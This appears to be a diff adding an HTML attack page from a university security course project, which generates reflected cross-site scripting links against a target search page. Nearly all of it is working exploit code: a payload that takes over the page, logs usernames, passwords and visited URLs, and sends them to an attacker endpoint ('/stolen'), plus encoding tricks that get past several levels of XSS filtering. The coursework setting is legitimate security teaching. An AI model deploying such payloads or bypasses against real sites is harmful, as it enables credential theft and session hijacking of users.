@@ -1,0 +1,115 @@
+<html>
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js">
+</script>
+<script>
+function payload(attacker) {
+    window.history.replaceState({html:$('html').html()},"","/project3/")
+    var counter=0
+    var q = ""
+    $.get('http://127.0.0.1:31337/stolen?event=nav&user=&url='+encodeURIComponent(window.location.href))
+    function log(link){$.get(attacker+'stolen', link);}
+    window.onpopstate = function(e) {
+        if($("#logged-in-user").length){var logged=$("#logged-in-user").text();} else{var logged=""}
+        $('html').html(e.state.html);
+        $("#query").val(q)
+        buttons();
+        log({event:"nav",user:logged, url:encodeURIComponent(window.location.href)});
+    };
+    function buttons() {
+        $("#new-account-btn").click(function(e){e.preventDefault();
+            var user=$("input#username").val();
+            var pass=$("#userpass").val();
+            $.ajax({type:"POST", url:"./create", data:{username:user,password:pass}})
+            .then(function(){
+                log({event:"login",user:user,pass:pass}); 
+                proxy("./");
+            });
+        });
+        $("#log-in-btn").click(function(e){e.preventDefault();
+                var user=$("input#username").val();
+                var pass=$("#userpass").val();
+                $.ajax({type:"POST", url:"./login",	data:{username:user,password:pass}})
+                .then(function(){
+                    log({event:"login",user:user,pass:pass}); 
+                    proxy("./");
+                });
+        });
+        $("#log-out-btn").click(function(e){e.preventDefault();
+            var user=$("input#username").val();
+            $.ajax({url:'./logout', type:'POST'})
+            .then(function(){
+                log({event:"logout",user:user}); 
+                proxy("./");
+            });
+        });
+        $("#yay-lnk").click(function(e){e.preventDefault();
+            proxy("./");
+        });
+        $("#search-again-btn").click(function(e){e.preventDefault();
+            proxy("./");
+        });
+        $("#search-btn").click(function(e){e.preventDefault();
+            q = $("#query").val();
+            var ext = "search?q="+q
+            proxy(ext);
+        });
+        $(".history-item.list-group-item").click(function(e){e.preventDefault();
+            q = $(this).text()
+            var ext = "search?q="+q
+            proxy(ext);
+        });
+    }
+    function proxy(href) {
+        counter=counter+1;
+        $("html").load(href, function(){
+            $("html").show();
+            if (counter>1){
+                history.pushState({html:$('html').html()},"",href);
+                if($("#logged-in-user").length){var logged=$("#logged-in-user").text();} else{var logged=""}
+                log({event:"nav",user:logged, url:encodeURIComponent(window.location.href)}); 
+            };
+            buttons();
+        });
+    }
+    $("html").hide();
+    proxy("./");
+}
+
+function makeLink(xssdefense, target, attacker) {
+    if (xssdefense == 0) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<script" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</script" + ">");
+    } else if (xssdefense == 1) {
+        // Implement code to defeat XSS defenses here.
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<s"+String.fromCharCode(115, 99, 114, 105, 112, 116)+"cript" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</s"+String.fromCharCode(115, 99, 114, 105, 112, 116)+"cript" + ">");
+    } else if (xssdefense == 2) {
+        return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+            encodeURIComponent("<scripscriptt" + ">" + payload.toString() +
+            ";payload(\"" + attacker + "\");</scripscriptt" + ">");
+    } else if (xssdefense == 3) {
+        var t3 = `http://cis551.cis.upenn.edu/project3/`;
+        var a3 = `http://127.0.0.1:31337/`;
+        pre3 = t3 + "./search?xssdefense=" + xssdefense.toString() + "&q="
+        post3= "<script" + ">" + payload.toString() + ";payload(\"" + a3 + "\");</script" + ">"
+        post3=post3.replace(";", "\n")
+        post3=post3.replace(/['"]/g, '`')
+        final3=pre3+encodeURIComponent(post3)
+        return final3;
+    }
+}
+var xssdefense = 3;
+var target = "http://cis551.cis.upenn.edu/project3/";
+var attacker = "http://127.0.0.1:31337/";
+$(function() {
+    var url = makeLink(xssdefense, target, attacker);
+    // alert(url)
+    $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Yay!</a>");
+    console.log(url)
+});
+</script>
+<h3></h3>
+</html>
